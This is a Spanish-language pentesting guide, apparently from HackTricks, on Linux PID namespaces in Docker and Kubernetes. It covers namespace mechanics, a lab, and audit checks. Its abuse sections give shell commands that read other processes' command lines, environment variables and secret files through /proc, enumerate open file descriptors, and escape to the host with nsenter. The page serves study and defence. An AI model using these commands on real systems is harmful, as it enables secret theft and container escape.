# Espacio de nombres PID

{{#include ../../../../../banners/hacktricks-training.md}}

## Descripción general

El espacio de nombres PID controla cómo se numeran los procesos y qué procesos son visibles. Por eso un contenedor puede tener su propio PID 1 aunque no sea una máquina real. Dentro del espacio de nombres, la carga de trabajo ve lo que parece un árbol de procesos local. Fuera de él, el host sigue viendo los PID reales del host y todo el panorama de procesos.<sup>[[3]](#references)</sup>

Desde el punto de vista de la seguridad, el espacio de nombres PID es importante porque la visibilidad de los procesos es valiosa. Cuando una carga de trabajo puede ver procesos del host, podría observar nombres de servicios, argumentos de línea de comandos, secretos pasados en argumentos de procesos, estado derivado del entorno a través de `/proc` y posibles objetivos para entrar en espacios de nombres. Si puede hacer algo más que ver esos procesos, como enviar señales o usar ptrace en las condiciones adecuadas, el problema se vuelve mucho más grave.

## Funcionamiento

Un nuevo espacio de nombres PID comienza con su propia numeración interna de procesos. El primer proceso creado dentro de él se convierte en PID 1 desde el punto de vista de ese espacio de nombres, lo que también significa que tiene una semántica especial similar a la de init para los procesos hijos huérfanos y el comportamiento de las señales. Esto explica muchas particularidades de los contenedores relacionadas con los procesos init, la recolección de procesos zombi y el uso ocasional de pequeños wrappers de init en los contenedores.<sup>[[3]](#references)</sup>

Los espacios de nombres PID forman una jerarquía. Un proceso en un espacio de nombres antecesor puede dirigirse a los descendientes usando el PID asignado en el antecesor, pero un descendiente no puede dirigirse a tareas que solo existen en un espacio de nombres antecesor mediante llamadas al sistema ordinarias basadas en PID, ni usar `setns()` para subir a un espacio de nombres PID antecesor. Sin embargo, un procfs perteneciente al antecesor y expuesto deliberadamente al descendiente puede filtrar la vista de procesos del antecesor. Además, unirse a un espacio de nombres PID con `setns()` cambia el espacio de nombres para los **futuros procesos hijos**, no para el proceso que hace la llamada; por eso las herramientas crean un proceso hijo después de unirse. Un montaje de procfs conserva la vista de PID del proceso que lo montó, por lo que crear un procfs nuevo después de `unshare(CLONE_NEWPID)` es importante para la seguridad y no solo una cuestión estética.<sup>[[3]](#references)</sup>

La lección importante sobre seguridad es que un proceso puede parecer aislado porque solo ve su propio árbol de PID, pero ese aislamiento puede eliminarse deliberadamente. Docker lo permite mediante `--pid=host`, mientras que Kubernetes lo hace con `hostPID: true`. Cuando el contenedor se une al espacio de nombres PID del host, la carga de trabajo ve directamente los procesos del host, y muchas vías de ataque posteriores se vuelven mucho más factibles.

## Laboratorio

Para crear manualmente un espacio de nombres PID:

```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```

La shell ahora ve una vista privada de los procesos. La flag `--mount-proc` es importante porque monta una instancia de procfs que coincide con el nuevo namespace de PID, lo que hace que la lista de procesos sea coherente desde dentro.<sup>[[3]](#references)</sup>

Para comparar el comportamiento de los contenedores:

```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```

La diferencia es inmediata y fácil de entender, por eso este es un buen primer laboratorio para los lectores.

## Uso en tiempo de ejecución

Los contenedores normales en Docker, Podman, containerd y CRI-O tienen su propio PID namespace. Los contenedores de Kubernetes normalmente tienen vistas de PID separadas; `shareProcessNamespace: true` crea deliberadamente una vista compartida para todo el Pod.<sup>[[4]](#references)</sup> En cambio, `hostPID: true` selecciona el PID namespace del nodo. Los entornos LXC/Incus se basan en la misma primitiva del kernel, aunque los casos de uso de system containers pueden mostrar árboles de procesos más complejos y fomentar el uso de más atajos de depuración.

La misma regla se aplica en todas partes: si el runtime optó por no aislar el PID namespace, se trata de una reducción deliberada del aislamiento del contenedor.

## Configuraciones incorrectas

La configuración incorrecta canónica es compartir el PID del host. Los equipos suelen justificarlo por comodidad para depurar, monitorizar o gestionar servicios, pero siempre debe tratarse como una excepción de seguridad significativa. Aunque el contenedor no tenga una primitiva de escritura inmediata sobre los procesos del host, la visibilidad por sí sola puede revelar mucha información del sistema. Una vez que se añaden capabilities como `CAP_SYS_PTRACE` o acceso útil a procfs, el riesgo aumenta considerablemente.

Otro error es suponer que, como por defecto la carga de trabajo no puede eliminar ni usar ptrace en procesos del host, compartir el PID del host es inocuo. Esa conclusión pasa por alto el valor de la enumeración, la disponibilidad de objetivos para entrar en namespaces y cómo la visibilidad de PID se combina con otros controles debilitados.

### Uso compartido de procesos en todo el Pod de Kubernetes

`shareProcessNamespace: true` es distinto de `hostPID`: expone los procesos de los **otros contenedores del mismo Pod**, no los procesos del nodo. Un sidecar comprometido o un contenedor de depuración puede entonces enumerar las líneas de comandos y los datos del entorno de los contenedores hermanos, sujeto a las comprobaciones de acceso de procfs; enviar señales cuando las credenciales lo permiten; y recorrer el sistema de archivos de un contenedor hermano a través de `/proc/<pid>/root`. Kubernetes advierte explícitamente que, en ese caso, los secretos de la línea de comandos y del entorno, así como los sistemas de archivos de los contenedores, están protegidos únicamente por los permisos Unix aplicables.<sup>[[4]](#references)</sup>

Revisión útil desde el lado del clúster:

```bash
kubectl get pods -A -o json | jq -r '
  .items[] |
  select(.spec.hostPID == true or .spec.shareProcessNamespace == true) |
  [.metadata.namespace,.metadata.name,
   (.spec.hostPID // false),(.spec.shareProcessNamespace // false)] | @tsv'
```

Desde un contenedor comprometido en un espacio de nombres PID compartido por todo el Pod, primero comprueba el acceso efectivo en lugar de asumir que la visibilidad equivale a la capacidad de lectura:<sup>[[4]](#references)</sup>

```bash
victim=$(ps -eo pid,args | awk '/[n]ginx|[j]ava|[p]ython/{print $1; exit}')
[ -n "$victim" ] || { echo "No candidate process found"; exit 1; }
tr '\0' ' ' < "/proc/$victim/cmdline" 2>/dev/null; echo
tr '\0' '\n' < "/proc/$victim/environ" 2>/dev/null | sed -n '1,20p'
find "/proc/$victim/root/run/secrets" -maxdepth 2 -type f -ls 2>/dev/null
```

### Contenedores efímeros dirigidos en un Pod de Kubernetes existente

Una identidad de Kubernetes con permiso para modificar `pods/ephemeralcontainers` puede agregar un depurador a un Pod en ejecución aunque `shareProcessNamespace` no esté configurado. Con `--target`, el depurador se une al espacio de nombres de procesos del contenedor indicado si el entorno de ejecución admite la selección de espacios de nombres. Esto permite ver los procesos de ese contenedor, no el espacio de nombres PID del host del nodo.<sup>[[5]](#references)</sup>

La API usa un subrecurso independiente, así que revisa los permisos `patch`/`update` en lugar de asumir que los permisos de escritura habituales sobre Pods también lo permiten.<sup>[[6]](#references)</sup>

Para un Pod y un contenedor dentro de un espacio de nombres autorizado, prueba la vista dirigida:<sup>[[5]](#references)[[6]](#references)</sup>

```bash
ns=default; pod=myapp; container=app
kubectl auth can-i get pods -n "$ns"
kubectl auth can-i patch pods/ephemeralcontainers -n "$ns"
kubectl auth can-i update pods/ephemeralcontainers -n "$ns"
kubectl auth can-i create pods/attach -n "$ns"
kubectl -n "$ns" debug -it "pod/$pod" --image=busybox:1.36 --target="$container" -- sh
# In the debug shell: verify the target processes are actually visible.
ps -ef
```

Si el runtime no implementa targeting, es posible que el debugger no se inicie o permanezca en un PID namespace aislado.<sup>[[5]](#references)</sup> Si el targeting funciona, usa las comprobaciones de [Uso compartido de procesos en todo el Pod de Kubernetes](#kubernetes-pod-wide-process-sharing) para probar el acceso a `/proc/<pid>`. La visibilidad no otorga permiso para leer los secretos del proceso objetivo ni enviarle señales: siguen aplicándose las credenciales de Unix y las comprobaciones de acceso de procfs.<sup>[[4]](#references)[[8]](#references)</sup> Los Pod Security Standards también restringen la configuración de privilegios en los ephemeral containers.<sup>[[7]](#references)</sup>

## Abuso

Si se comparte el PID namespace del host, un atacante puede inspeccionar los procesos del host, recolectar los argumentos de los procesos, identificar servicios interesantes, localizar PIDs candidatos para `nsenter` o combinar la visibilidad de los procesos con privilegios relacionados con ptrace para interferir con las cargas de trabajo del host o de otros entornos cercanos. En algunos casos, basta con ver el proceso de larga duración adecuado para replantear el resto del plan de ataque.

El primer paso práctico siempre es confirmar que los procesos del host son realmente visibles:

```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```

Una vez que los PID del host son visibles, los argumentos de los procesos y los destinos de entrada al namespace suelen ser la fuente de información más útil:

```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
  echo "PID=$p"
  tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```

Si `nsenter` está disponible y se cuenta con privilegios suficientes, comprueba si se puede usar un proceso visible del host como puente entre espacios de nombres:

```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```

Aunque se bloquee la entrada, compartir los PID del host ya es valioso porque revela la distribución de los servicios, los componentes del entorno de ejecución y los procesos privilegiados que podrían ser los siguientes objetivos. La visibilidad de los PID por sí sola **no** concede permiso para enviar señales, rastrear procesos, leer entradas sensibles de `/proc/<pid>` ni unirse a los otros namespaces del objetivo; siguen siendo relevantes las credenciales, la condición de dumpable, las capabilities en el user namespace propietario del namespace del objetivo, las políticas de Yama/LSM y seccomp.<sup>[[3]](#references)</sup> Consulta [CAP_SYS_PTRACE](../../../../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace) para ver ejemplos de inyección de procesos.

La visibilidad de los PID del host también hace más realista el abuso de descriptores de archivo. Si un proceso privilegiado del host o una workload vecina tiene abierto un archivo o socket sensible, el atacante quizá pueda inspeccionar `/proc/<pid>/fd/` y acceder al objeto subyacente, según las comprobaciones de tipo ptrace, la propiedad, las opciones de montaje de procfs, el tipo de objeto y el modelo del servicio objetivo. Ver un enlace simbólico a un FD no significa que se pueda abrir, y un socket no se puede duplicar simplemente abriendo su enlace simbólico `/proc/<pid>/fd/N`. Para la primitiva específica `pidfd_getfd()` y sus comprobaciones de autorización, consulta [Linux ptrace exit-race pidfd FD theft](../../../../main-system-information/kernel-lpe-cves/linux-ptrace-exit-race-pidfd_getfd-fd-theft.md).<sup>[[3]](#references)</sup>

```bash
for fd_dir in /proc/[0-9]*/fd; do
  ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```

Estos comandos son útiles porque indican si `hidepid=1` o `hidepid=2` está reduciendo la visibilidad entre procesos y si se pueden ver descriptores obviamente interesantes, como archivos secretos abiertos, logs o sockets Unix.

### Ejemplo completo: PID del host + `nsenter`

Compartir el PID del host puede permitir un host escape cuando el proceso tiene las capabilities necesarias para unirse a los namespaces del host y adoptar la raíz del proceso del host. Para esto último se necesita `nsenter --root` (`-r`): cambiar solo el mount namespace no cambia el directorio raíz del proceso que ejecuta el comando.<sup>[[9]](#references)</sup> El acceso a `/proc/1/root` está sujeto a una comprobación de lectura de ptrace, mientras que cambiar la raíz requiere `CAP_SYS_CHROOT` en el user namespace del proceso que ejecuta el comando.<sup>[[8]](#references)[[10]](#references)</sup>

```bash
ps -ef | head -n 50
capsh --print | grep -E 'cap_sys_admin|cap_sys_chroot'
nsenter -t 1 -m -u -n -i -p -r -W / -- /bin/sh
```

Si el comando se ejecuta correctamente, el nuevo shell usa los namespaces de mount, UTS, network, IPC y PID del host, y el sistema de archivos raíz de PID 1. Comprueba la identidad efectiva y los permisos de acceso; no des por sentado que la visibilidad de los PID por sí sola otorgó privilegios de host.<sup>[[9]](#references)</sup>

Aunque falte `nsenter`, es posible que se pueda lograr el mismo resultado mediante el binario del host si el sistema de archivos del host está montado:

```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p -r -W / -- /bin/sh 2>/dev/null
```

### Notas recientes sobre el runtime

Algunos ataques relevantes para los PID namespaces no son configuraciones incorrectas tradicionales de `hostPID: true`, sino bugs en la implementación del runtime relacionados con la forma en que se aplican las protecciones de procfs durante la configuración del contenedor.

#### Race de `maskedPaths` hacia el procfs del host

En versiones vulnerables de `runc`, los atacantes capaces de controlar la imagen del contenedor o la carga de trabajo de `runc exec` podían competir con la fase de enmascaramiento reemplazando el `/dev/null` del contenedor por un symlink a una ruta sensible de procfs, como `/proc/sys/kernel/core_pattern`. Si la race tenía éxito, el bind mount de la ruta enmascarada podía aplicarse al destino incorrecto y exponer al nuevo contenedor parámetros de procfs globales del host.<sup>[[1]](#references)</sup>

Comando útil para revisar:

```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```

Esto es importante porque el impacto final puede ser el mismo que una exposición directa de procfs: `core_pattern` o `sysrq-trigger` con permisos de escritura, seguido de ejecución de código en el host o denegación de servicio. Las páginas dedicadas a [masked paths](../masked-paths.md) y [sensitive host mounts](../../sensitive-host-mounts.md) cubren la superficie de ataque general de procfs sin duplicarla aquí.

#### Inyección de namespaces con `insject`

Las herramientas de inyección de namespaces, como `insject`, muestran que la interacción con PID namespaces no siempre requiere entrar en el namespace de destino antes de crear el proceso. Un helper puede adjuntarse más tarde, usar `setns()` y ejecutar código manteniendo la visibilidad del espacio de PID de destino:<sup>[[2]](#references)</sup>

```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```

Este tipo de técnica es relevante sobre todo para la depuración avanzada, las herramientas ofensivas y los flujos de trabajo de post-exploitation en los que hay que acceder al contexto del namespace después de que el runtime ya haya inicializado la carga de trabajo.

### Patrones relacionados de abuso de FD

Conviene mencionar explícitamente dos patrones cuando los PID del host son visibles. Primero, un proceso privilegiado puede mantener abierto un descriptor de archivo sensible tras `execve()` porque no se marcó con `O_CLOEXEC`. Segundo, los servicios pueden pasar descriptores de archivo a través de sockets Unix mediante `SCM_RIGHTS`. En ambos casos, el objeto de interés ya no es la ruta, sino el identificador abierto que un proceso con menos privilegios puede heredar o recibir.

Esto es importante al trabajar con contenedores porque el identificador puede apuntar a `docker.sock`, un registro privilegiado, un archivo con secretos del host u otro objeto de gran valor, incluso cuando no se puede acceder directamente a la ruta desde el sistema de archivos del contenedor.

## Comprobaciones

El propósito de estos comandos es determinar si el proceso tiene una vista privada de los PID o si ya puede enumerar un conjunto mucho más amplio de procesos.

```bash
readlink /proc/self/ns/{pid,pid_for_children,user,mnt}
grep -E '^(Name|Pid|PPid|NSpid|Uid|Gid|TracerPid):' /proc/self/status
ps -ef | head
findmnt -no TARGET,FSTYPE,OPTIONS /proc
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
capsh --print 2>/dev/null | grep -E 'Current:|Bounding'
```

¿Qué es interesante aquí:<sup>[[3]](#references)</sup>

- Si la lista de procesos contiene servicios del host evidentes, probablemente ya se esté compartiendo el PID del host.
- Ver solo un árbol diminuto y local al contenedor es lo normal; ver `systemd`, `dockerd` o daemons no relacionados no lo es.
- `NSpid` puede revelar la asignación de PID entre namespaces anidados. El valor más a la izquierda corresponde al namespace de PID asociado al montaje de procfs, seguido de los valores de los namespaces anidados sucesivamente.
- `readlink /proc/self/ns/pid` por sí solo no puede demostrar `hostPID`: un contenedor aislado también tiene un inode válido de namespace de PID. Contrástalo con la lista de procesos, el montaje de procfs, la configuración del runtime y un inode del namespace del lado del host, cuando esté disponible.
- Una vez visibles los PID del host, incluso la información de procesos de solo lectura resulta útil para el reconocimiento.

Si descubres que un contenedor se ejecuta compartiendo el PID del host, no lo trates como una diferencia cosmética. Cambia considerablemente lo que la carga de trabajo puede observar y, potencialmente, afectar.





## References

- [1] [Aviso de seguridad de runc: escape del contenedor mediante abuso de "masked path" debido a condiciones de carrera en el montaje (CVE-2025-31133)](https://github.com/opencontainers/runc/security/advisories/GHSA-9493-h29p-rfm2)
- [2] [Lanzamiento de herramienta – insject: un inyector de Linux Namespace](https://www.nccgroup.com/research-blog/tool-release-insject-a-linux-namespace-injector/)
- [3] [Libro Linux man-pages 6.19](https://www.kernel.org/pub/linux/docs/man-pages/book/man-pages-6.19.pdf)
- [4] [Compartir el namespace de procesos entre contenedores de un Pod](https://kubernetes.io/docs/tasks/configure-pod-container/share-process-namespace/)
- [5] [Depurar Pods en ejecución](https://kubernetes.io/docs/tasks/debug/debug-application/debug-running-pod/)
- [6] [KEP de contenedores efímeros](https://www.kubernetes.dev/resources/keps/277/)
- [7] [Estándares de seguridad de Pods](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
- [8] [proc_pid_root(5)](https://man7.org/linux/man-pages/man5/proc_pid_root.5.html)
- [9] [nsenter(1)](https://man7.org/linux/man-pages/man1/nsenter.1.html)
- [10] [chroot(2)](https://man7.org/linux/man-pages/man2/chroot.2.html)
{{#include ../../../../../banners/hacktricks-training.md}}
